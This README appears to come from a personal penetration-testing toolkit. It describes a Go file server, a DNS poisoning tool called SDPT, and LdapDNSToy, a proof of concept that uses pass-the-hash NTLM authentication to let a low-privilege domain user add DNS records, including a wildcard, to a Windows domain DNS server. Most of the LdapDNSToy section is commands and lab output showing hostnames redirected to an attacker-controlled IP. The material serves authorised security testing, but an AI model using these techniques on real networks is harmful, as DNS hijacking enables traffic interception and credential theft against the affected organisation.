# Vault
This is just a place where I put simple scripts and notes to access them quickly.

## SimpleHTTPServer.go
This is what you may need when doing a pentest and Python is not there to help you!
As GO builds a portable file for many architectures, it is our saviour :)
```
Test it:
    $ go run SimpleHTTPServer.go 8080 ./

Build it:
    $ env GOOS=linux GOARCH=arm GOARM=7 go build SimpleHTTPServer.go
```

## SDPT (Simple DNS Poisoner Tool) 
Sniffes for DNS queries going through your attacker host and provides fake answers to the specified DNS type A queries. It also forwards other queries different than type A and those pointing to FQDN that are not specifically included within the fake list.

## LdapDNSToy
This simple PoC allows to insert DNS type A records on a Windows Domain DNS server via LDAP by means of a Domain User (without additional privileges) using Python. 
* The original idea can be read here: https://blog.netspi.com/exploiting-adidns/

*Note: This is just a PoC, so don't use it in production systems or do it under your risk.*

### Basic Usage:
**1. Adding a new DNS node (type A record)**

Observe the host "nodito.bransh.local" does not exist:
```
root@kali:/# host nodito.bransh.local 10.x.x.190
Using domain server:
Name: 10.x.x.190
Address: 10.x.x.190#53
Aliases: 

Host nodito.bransh.local not found: 3(NXDOMAIN)
root@kali:/#
```
Let's add it pointing to the attacker-controlled IP 10.x.x.111:
```
root@kali:/# python LdapDNSToy.py -d bransh.local -u lowpriv1 -hash FBDCD5041C96DDBD82224270B57F11FC -dc 10.x.x.190 -ip 10.x.x.111 -name nodito
[*] Creating an LDAP connection.
[*] Using NTLM authentication.
[*] The object was successfully added.
root@kali:/# 
```
Wait for a few minutes and then try to solve it again:
```
root@kali:/# host nodito.bransh.local 10.x.x.190
Using domain server:
Name: 10.x.x.190
Address: 10.x.x.190#53
Aliases: 

nodito.bransh.local has address 10.x.x.111
root@kali:/# 
```

**2. Adding a wildcard DNS node (type A record)**

Observe the host "nodito.bransh.local" does not exist:
```
root@kali:/# python LdapDNSToy.py -d bransh.local -u lowpriv1 -hash FBDCD5041C96DDBD82224270B57F11FC -dc 10.x.x.190 -ip 10.x.x.111 -name \*
[*] Creating an LDAP connection.
[*] Using NTLM authentication.
[*] The object was successfully added.
root@kali:/# 
```

Now, try to resolve any hostname such as unknown or trulyunknown and observe how they ALL point to the same attacker-controlled IP:
```
root@kali:/# host unknown.bransh.local 10.x.x.190
Using domain server:
Name: 10.x.x.190
Address: 10.x.x.190#53
Aliases: 

unknown.bransh.local has address 10.x.x.111
```
```
root@kali:/# host trulyunknown.bransh.local 10.x.x.190
Using domain server:
Name: 10.x.x.190
Address: 10.x.x.190#53
Aliases: 

trulyunknown.bransh.local has address 10.x.x.111
root@kali:/# 
```
